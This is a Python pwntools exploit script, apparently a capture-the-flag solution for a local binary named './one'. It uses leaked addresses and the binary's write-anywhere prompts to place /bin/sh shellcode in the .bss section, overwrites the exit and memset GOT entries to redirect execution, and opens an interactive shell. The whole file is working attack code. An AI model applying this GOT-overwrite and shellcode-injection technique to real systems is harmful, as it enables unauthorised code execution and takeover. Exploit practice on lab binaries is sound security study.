from pwn import *
p=process('./one')
# gdb.attach(p)
# context.log_level='debug'
context.arch='amd64'
elf=ELF('./one')
pause()
p.recvuntil(b'main addr = ')
main_addr=int(p.recvuntil(b' ')[:-1].decode(),16)
p.recvuntil(b'stack addr =  ')
stack_addr=int(p.recvuntil(b'\n')[:-1].decode(),16)

print("main_addr",hex(main_addr))
print("stack_addr",hex(stack_addr))

pro_base=main_addr-elf.sym['main']

p.recvuntil(b' write?\n')
memset_addr=pro_base+elf.got['memset']
print("memset_addr",hex(memset_addr))
exit_addr=pro_base+elf.got['exit']
print("exit_addr",hex(exit_addr))
p.sendline(hex(memset_addr).encode())
num=elf.sym['_start']%256
print("write num",num)
p.recvuntil(b' write?\n')
pause()
p.sendline(str(num).encode())
shellcode=asm(shellcraft.sh())
bss_addr=pro_base+elf.bss()
print("bss_addr",hex(bss_addr))
input_begin=bss_addr+0x200
print("input_begin",hex(input_begin))

for index,item in enumerate(shellcode):
    print(hex(item),index)
    p.recvuntil(b'What address you want to write?\n')
    p.sendline(hex(input_begin+index).encode())
    p.recvuntil(b'What value you want to write?\n')
    p.sendline(str(item).encode())
    # pause()
for i in range(5):
    p.recvuntil(b'What address you want to write?\n')
    p.sendline(hex(exit_addr+i).encode())
    p.recvuntil(b'What value you want to write?\n')
    print(i,hex((p64(input_begin)[i])))
    p.sendline(str((p64(input_begin)[i])).encode())
    # pause()
# pause()
p.recvuntil(b'What address you want to write?\n')
p.sendline(hex(memset_addr).encode())
p.recvuntil(b'What value you want to write?\n')
p.sendline(str((p64(elf.plt['memset']+6)[i])).encode())

pause()

context.log_level='debug'
p.recvuntil(b'What address you want to modify?\n')
p.sendline(hex(bss_addr-0x80).encode())
# p.recvuntil(b'What value you want to modify?')




p.interactive()